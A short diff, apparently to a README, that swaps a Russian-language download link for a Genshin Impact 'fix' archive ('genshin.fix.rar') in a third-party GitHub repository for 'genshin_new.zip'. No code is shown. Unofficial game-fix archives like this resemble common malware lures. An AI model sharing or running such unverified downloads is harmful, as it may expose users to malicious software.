@@ -9,4 +9,4 @@
 
 
 
-Скачать можно здесь - https://github.com/defoxxx/Genshin-Impact/releases/download/cc/genshin.fix.rar
+Скачать можно здесь - https://github.com/defoxxx/Genshin-Impact/releases/download/cc/genshin_new.zip
